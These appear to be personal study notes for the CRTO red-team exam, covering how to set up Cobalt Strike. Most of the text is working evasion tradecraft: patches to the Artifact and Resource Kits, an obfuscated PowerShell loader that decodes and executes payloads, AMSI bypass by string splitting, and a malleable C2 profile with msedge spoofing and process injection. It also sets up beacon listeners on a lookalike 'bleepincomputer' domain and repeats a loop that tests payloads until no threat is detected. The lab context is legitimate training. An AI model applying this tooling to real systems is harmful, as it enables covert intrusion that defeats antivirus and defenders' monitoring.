Cobalt Strike OPSEC Notes
```powershell
beacon> upload msedge.exe   # naming payloads as msedge helps with evasion
beacon> timestomp [payload] [other thing] # helps blend it in 

LSASS Dumping generally a bad idea -- triage and dump (kerberos) dump from memory and are better

Kerberos has a lot of OPSEC to be aware of...

LDAP Queries, be careful

# Lateral Movement
WinRM is good
PSExec sucks, SCShell is better
LOLBAS overrated, usually blocked

# Pivoting
Kerberos > NTLM

# Kerberos
lost of cool stuff
run klist is BAD OPSEC 
dont kerberoast stuff for no reason...

# Domain dominance
diamond tickets are the best opsec...
```

One Liners
```powershell
Set-MPPreference -DisableRealTimeMonitoring $false # Enable defender
```

http://www.bleepincomputer.com:80/test

Thing we want to avoid during Exam
	![[Pasted image 20260108200319.png]]

Workflow for exam
	Setup artifact kit, resource kit, elevate, compile. Load into CS
		test with ThreatCheck
		redo as needed?
	modify malleable C2 profile
	Setup listeners
	start?

## Initial Setup for CRTO Exam

1.- Modify Artifact Kit
```c
/* Open C:\Tools\cobaltstrike\arsenal-kit\kits\artifact in VSCode */
/* Navigate to src-common and open patch.c. */

/* Line 45, replace for loop with while loop */
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}

/* Line ~116, replace for loop with while loop */
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}
```

```powershell
# Modify script_template.cna and replace all instances of rundll32.exe with dllhost.exe
$template_path="C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\script_template.cna" ; (Get-Content -Path $template_path) -replace 'rundll32.exe' , 'msedge.exe' | Set-Content -Path $template_path

# Compile the Artifact kit (From WSL in Attacker windows Machine)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
$ ./build.sh mailslot VirtualAlloc 344564 0 false false none /mnt/c/Tools/cobaltstrike/artifacts 

# Check Artifact kit payload against ThreatCheck
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\mailslot\artifact64big.exe
	# Make note of hexcode identified, reverse via Ghidra, modify, save.

# Recompile
# Retest
# Repeat until...
[+] No threat found!

# Load into Cobalt Strike
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

2.- Compile Resource Kit
```powershell
# Compile (WSL)
$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource && ./build.sh /mnt/c/Tools/cobaltstrike/resources

# Test
PS > C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\resources\template.x64.ps1 -e amsi
	# Make note of code identified, open with VSCode

# Open C:\Tools\cobaltstrike\resources in VSCode
# Select template.x64.ps1

# Line 5, replace .Equals('System.dll')
.Equals('Sys'+'tem.dll')

# Line 32, replace entire line
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

# Select compress.ps1
# Use Invoke-Obfuscation to create unique obfuscation, or...
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

# Save

# Rebuild
# Retest
# Repeat until...
[+] No threat found!

# Load into Cobalt Strike
C:\Tools\cobaltstrike\custom-resources\resources.cna
```

3.- Malleable C2 Setup
```powershell
# SSH into team server
ssh attacker@10.0.0.5

# Move to profiles directory
cd /opt/cobaltstrike/profiles

# Modify C2 profile
vim default.profile

# Modify the file

stage {
   set userwx "false";
   set module_x64 "Hydrogen.dll";  # use a different module if you like
   set copy_pe_header "false";
}

post-ex {
  set amsi_disable "true";
  set spawnto_x64 "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe";
  set obfuscate "true";
  set cleanup "true";

  transform-x64 {
      strrep "ReflectiveLoader" "NetlogonMain";
      strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
      strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";

      # add any other transforms that you want
  }
}

process-inject {
  execute {
      NtQueueApcThread-s;
      NtQueueApcThread;
      SetThreadContext;
      RtlCreateUserThread;
      CreateThread;
  }
}

# Save, then restart teamserver
sudo /usr/bin/docker restart cobaltstrike-cs-1
```

4.- Create Listeners
```powershell
Cobalt Strike > Listeners > Add

# HTTP
Name: http
Payload: Beacon HTTP
HTTP Hosts: www.bleepincomputer.com
HTTP Host (Stager) : www.bleepincomputer.com

# SMB
Name: smb
Payload: Beacon SMB
Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337  # > ls \\.\pipe\
	# For realworld, consider msedge.pipe.7732 or something similar...

# TCP
Name: tcp
Payload: Beacon TCP
Port: 4444
Bind to localhost: False

# TCP (local)
Name: tcp-local
Payload: Beacon TCP
Port: 1337
Bind to localhost: True

# Generate Payloads
Payloads > Windows Stageless Generate All Payloads # Folder: C:\Payloads
```



